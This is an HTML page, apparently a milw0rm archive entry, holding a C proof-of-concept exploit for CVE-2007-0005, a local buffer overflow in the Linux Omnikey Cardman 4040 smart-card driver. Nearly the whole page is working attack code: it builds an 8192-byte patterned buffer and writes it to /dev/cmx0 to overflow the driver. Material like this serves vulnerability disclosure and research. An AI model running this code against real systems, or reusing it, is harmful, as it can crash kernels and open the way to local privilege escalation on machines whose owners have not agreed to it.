<html><head><title>Linux Omnikey Cardman 4040 driver Local Buffer Overflow Exploit PoC</title></head><pre>/*
 * Linux Omnikey Cardman 4040 driver buffer overflow (CVE-2007-0005)
 * Copyright (C) Daniel Roethlisberger &lt;daniel.roethlisberger@csnc.ch&gt;
 * Compass Security Network Computing AG, Rapperswil, Switzerland.
 * All rights reserved.
 * http://www.csnc.ch/
 */

#include&lt;sys/stat.h&gt;
#include&lt;fcntl.h&gt;
#include&lt;unistd.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
#include&lt;errno.h&gt;

int main(int argc, char *argv[]) {
   int fd, i, n;
   char buf[8192];

   /*
    * 0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f  ...
    * 00 01 00 02 00 03 00 04 00 05 00 06 00 07 00 08 ...
    */
   for (i = 0; i &lt; sizeof(buf); i += 2) {
       buf[i]   = (char)(((i/2) &amp; 0xFF00) &gt;&gt; 8);
       buf[i+1] = (char) ((i/2) &amp; 0x00FF);
   }

   if ((fd = open(&quot;/dev/cmx0&quot;, O_RDWR)) &lt; 0) {
       printf(&quot;Error: open() =&gt; %s\n&quot;, strerror(errno));
       exit(errno);
   }
   if ((n = write(fd, buf, sizeof(buf))) &lt; 0) {
       printf(&quot;Error: write() =&gt; %s\n&quot;, strerror(errno));
       exit(errno);
   }
   printf(&quot;%d of %d bytes written\n&quot;, n, sizeof(buf));
   exit(0);
}

// milw0rm.com [2007-03-09]</pre></html>